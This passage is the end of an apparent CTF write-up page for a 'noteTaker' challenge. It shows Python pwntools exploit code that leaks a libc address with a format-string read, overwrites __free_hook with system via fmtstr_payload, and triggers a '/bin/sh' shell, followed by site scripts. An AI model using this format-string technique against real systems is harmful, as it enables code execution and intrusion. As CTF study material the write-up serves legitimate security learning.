</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;note: &#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_note</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">clear_note</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#STEP 1: Leak libc</span>
</span></span><span class="line"><span class="cl"><span class="n">write_note</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%1$p</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">read_note</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Leaked: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LEAK_OFFSET</span> <span class="o">=</span> <span class="mh">0x3c4b28</span>  
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="n">LEAK_OFFSET</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># STEP 2: Calculate addresses</span>
</span></span><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;__free_hook: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;system: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># STEP 3: Overwrite __free_hook with system</span>
</span></span><span class="line"><span class="cl"><span class="n">clear_note</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">BUFFER_OFFSET</span> <span class="o">=</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">BUFFER_OFFSET</span><span class="p">,</span> <span class="p">{</span><span class="n">free_hook</span><span class="p">:</span> <span class="n">system</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_note</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">read_note</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># STEP 4: Trigger free(&#34;/bin/sh&#34;) -&gt; system(&#34;/bin/sh&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p><img alt="shell" loading="lazy" src="/writeups/ctfs/pascalctf/assets/noteTaker_shell.png"></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2026 <a href="http://localhost:1313/">the008Ki11er</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
